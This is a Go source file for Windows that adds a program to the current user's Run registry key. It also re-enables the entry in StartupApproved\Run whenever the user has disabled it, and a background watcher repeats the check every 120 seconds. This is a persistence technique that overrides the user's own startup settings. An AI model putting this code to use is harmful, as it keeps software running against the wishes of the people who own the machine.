package autorun

import (
	"time"

	"golang.org/x/sys/windows/registry"
)

// adds a 'path' file to startup; if disabled in startup, enables it
func AddToAutorun(path string, name string) error {
	// we open the Run registry key for the current user
	runKey, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		return err
	}
	defer runKey.Close()

	// we check if the startup entry already exists by attempting to get its string value
	_, _, err = runKey.GetStringValue(name)
	exists := err == nil
	if err != nil && err != registry.ErrNotExist {
		return err
	}

	// if the entry does not exist, create it with the provided path
	if !exists {
		if err := runKey.SetStringValue(name, path); err != nil {
			return err
		}
	}

	// we open the StartupApproved\Run key to manage approval status
	approvedKey, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		// if the key doesn't exist, it's not an error; just return nil as the main entry is set
		if err == registry.ErrNotExist {
			return nil
		}
		return err
	}
	defer approvedKey.Close()

	value, _, err := approvedKey.GetBinaryValue(name)
	isDisabled := false
	if err == nil {
		// if the first byte is 0x03, the entry is disabled
		if len(value) > 0 && value[0] == 0x03 {
			isDisabled = true
		}
	} else if err != registry.ErrNotExist {
		return err
	}

	if isDisabled || err == registry.ErrNotExist {
		enabledValue := []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
		if err := approvedKey.SetBinaryValue(name, enabledValue); err != nil {
			return err
		}
	}

	return nil
}

// every 120 seconds, checks autostart
func StartWatcher(dir string, name string) {
	go func() {
		for {
			_ = AddToAutorun(dir, name)
			time.Sleep(120 * time.Second)
		}
	}()
}
